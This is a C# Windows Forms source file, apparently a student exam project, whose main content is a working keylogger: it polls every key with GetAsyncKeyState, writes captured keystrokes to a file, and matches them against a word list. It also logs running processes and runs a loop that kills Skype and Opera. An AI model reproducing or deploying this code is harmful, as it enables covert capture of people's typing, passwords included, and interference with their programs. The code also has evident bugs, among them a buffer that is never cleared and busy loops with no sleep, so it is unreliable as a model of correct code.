using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SPExam
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public Form1()
        {
            InitializeComponent();
        }

        private void KeyLoggerBrowse_Click(object sender, EventArgs e)
        {
            SaveFileDialog dlg = new SaveFileDialog();
            dlg.CheckFileExists = false;
            dlg.OverwritePrompt = true;
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                KeyLoggerText.Text = dlg.FileName;
            }
            else KeyLoggerText.Text = "";
        }

        Thread KeyLoggerThread = null;
        Thread WordsListThread = null;
        string buf = null;
        bool isLogger = true;
        bool IsAppLogger = true;
        bool wordsLogger = true;
        string buff = "";

        private void KeyLoggerStart_Click(object sender, EventArgs e)
        {
            if (KeyLoggerThread != null)
            {
                return;
            }

            KeyLoggerThread = new Thread(KeyLoggerRoutine);
            KeyLoggerThread.IsBackground = true;
            KeyLoggerThread.Start();

            button1.Enabled = true;
            WordsListButton.Enabled = true;
            KeyLoggerStopButton.Enabled = true;
            KeyLoggerStart.Enabled = false;
        }

        private void KeyLoggerRoutine()
        {
            while (isLogger == true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i).ToString().Length == 1)
                        {
                            buf += ((Keys)i).ToString();
                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }
                        if (buf.Length > 10)
                        {
                            using (FileStream fstream = new FileStream(KeyLoggerText.Text + ".txt", FileMode.OpenOrCreate))
                            {
                                byte[] byteBuf = Encoding.Default.GetBytes(buf);
                                fstream.Write(byteBuf, 0, byteBuf.Length);
                                fstream.Close();
                            }
                        }
                    }
                }
            }
        }

        private void AppLoggerBrowse_Click(object sender, EventArgs e)
        {
            SaveFileDialog dlg = new SaveFileDialog();
            dlg.CheckFileExists = false;
            dlg.OverwritePrompt = true;
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                AppLoggerText.Text = dlg.FileName;
            }
            else AppLoggerText.Text = "";
        }

        Thread AppLoggerThread = null;

        private void AppLoggerStart_Click(object sender, EventArgs e)
        {
            if (AppLoggerThread != null)
            {
                return;
            }
            AppLoggerThread = new Thread(AppLoggerRoutine);
            AppLoggerThread.IsBackground = true;
            AppLoggerThread.Start();
            AppLoggerStart.Enabled = false;
            AppLoggerStopButoon.Enabled = true;
        }

        private void AppLoggerRoutine()
        {
            Process[] processes;
            processes = Process.GetProcesses();

            string buf = null;
            while (IsAppLogger == true)
            {
                foreach (var process in processes)
                {
                    buf += "Id:" + process.Id.ToString() + " Name: " + process.ProcessName /*+ " Start time: " + process.StartTime */+ "\r\n";
                }
                File.AppendAllText(AppLoggerText.Text + ".txt", buf);
            }
        }

        Thread ModerThread = null;

        private void ModerButton_Click(object sender, EventArgs e)
        {
            if (ModerThread != null)
            {
                return;
            }

            ModerThread = new Thread(Moderation);
            ModerThread.IsBackground = true;
            ModerThread.Start();
        }

        private void Moderation()
        {
            Process[] processes;
            processes = Process.GetProcesses();
            string[] programms = { "Skype", "opera" };
            List<String> listOfProgramms = programms.ToList();

            while (true)
            {
                foreach (var process in processes)
                {
                    if (listOfProgramms.Contains(process.ProcessName))
                    {
                        try
                        {
                            process.Kill();
                        }
                        catch(Exception)
                        {

                        }
                        process.WaitForExit();
                    }
                    else
                    {
                        processes = Process.GetProcesses();
                    }
                }
            }
        }

        private void CloseButton_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ReadText.Text = "";

            FileStream fstream = new FileStream(KeyLoggerText.Text + ".txt", FileMode.OpenOrCreate);
            byte[] array = new byte[fstream.Length];
            fstream.Read(array, 0, array.Length);
            string textFromFile = Encoding.Default.GetString(array);

            ReadText.Text = textFromFile;
        }

        private void KeyLoggerStopButton_Click(object sender, EventArgs e)
        {
            isLogger = false;
            WordsListThread = new Thread(WordList);
            WordsListThread.IsBackground = true;
            WordsListThread.Start();
        }

        private void WordsListButton_Click(object sender, EventArgs e)
        {
            wordsLogger = false;
            Thread.Sleep(1000);
            ReadText.Text = "";
            string textFromFile;
            //using (FileStream fstream = new FileStream(KeyLoggerText.Text + "_WordsList.txt", FileMode.Open, FileAccess.Read))
            //{   
            //    byte[] array = new byte[fstream.Length];
            //    fstream.Read(array, 0, array.Length);
            //    textFromFile = Encoding.Default.GetString(array);
            //}

            ReadText.Text = buff;
        }

        private void WordList()
        {
            int indexOfChar = -1;
            string[] words = { "abc", "def", "asd" };


                if (buf != null)
                {
                    foreach (var item in words)
                    {
                        indexOfChar = buf.IndexOf(item.ToUpper());
                        if (indexOfChar != -1)
                        {
                            buff += item + " ";
                        }
                    }

                using (FileStream fstream = new FileStream(KeyLoggerText.Text + "_WordsList.txt", FileMode.OpenOrCreate, FileAccess.Write))
                {
                    byte[] byteBuf = Encoding.Default.GetBytes(buff);
                    fstream.WriteAsync(byteBuf, 0, byteBuf.Length);
                    fstream.Close();
                }
            }
        }

        private void AppLoggerStopButoon_Click(object sender, EventArgs e)
        {
            IsAppLogger = false;
        }
    }
}